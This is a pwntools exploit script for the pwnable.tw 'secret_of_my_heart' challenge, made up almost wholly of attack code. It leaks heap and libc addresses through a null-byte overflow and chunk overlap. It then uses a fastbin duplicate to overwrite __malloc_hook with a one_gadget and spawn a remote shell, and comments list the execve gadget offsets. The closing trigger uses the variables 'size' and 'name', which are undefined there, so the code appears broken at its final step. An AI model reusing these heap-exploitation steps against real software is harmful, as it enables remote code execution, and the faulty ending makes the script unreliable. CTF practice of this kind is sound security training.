#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./secret_of_my_heart"
libcPath = "./libc_64.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10302

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    main_arena = 0x399b00
    one_gadget = 0x3f32a
    context.log_level = "debug"
    libc = elf.libc

elif sys.argv[1] == "d":
    io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    context.log_level = "debug"
    main_arena = 0x3c3b20
    '''
    0x45216	execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    
    0x4526a	execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    
    0xef6c4	execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    
    0xf0567	execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    
    '''
    one_gadget = 0x4526a
    if libcPath:
        libc = ELF(libcPath)

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    main_arena = 0x3c3b20
    one_gadget = 0x4526a
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[2], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def add(size, name, cont):
    io.sendlineafter(" :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendafter(" :", name)
    io.sendafter(" :", cont)

def show(idx):
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", str(idx))

def delete(idx):
    io.sendlineafter(" :", "3")
    io.sendlineafter(" :", str(idx))

if __name__ == "__main__":
    #  DEBUG([0x1022], True)
    add(0x68, '0' * 0x20, 'aaaa')
    show(0)
    io.recvuntil('0' * 0x20)
    heapbase = u64(io.recvn(6).ljust(8, '\0')) - 0x10
    success("heap", heapbase)

    add(0xf8, '1' * 0x20, 'bbbb')
    add(0x68, '2' * 0x20, 'cccc')
    delete(0)

    add(0x68, '3' * 0x20, p64(heapbase + 0x20 - 0x18) + p64(heapbase + 0x20 - 0x10) + p64(heapbase) + 'd' * 0x48 + p64(0x70))
    #  DEBUG([0xE20], True)
    delete(1)

    show(0)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - main_arena
    success("libc", libc.address)

    add(0x68, '4' * 0x20, 'eeee')
    add(0xf8, '5' * 0x20, 'ffff')
    add(0x68, '6' * 0x20, 'gggg')
    delete(0)
    delete(2)
    delete(1)

    add(0x68, "name", p64(libc.sym['__malloc_hook'] - 0x23))
    add(0x68, "name", 'gggg')
    add(0x68, "name", 'gggg')
    payload = '\0' * 11 + p64(libc.address + one_gadget) + p64(libc.sym['__libc_realloc'] + 16)
    #  DEBUG([0xDE2], True)
    add(0x68, '6' * 0x20, payload)

    io.sendlineafter(" :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendafter(" :", name)

    
    io.interactive()
    io.close()


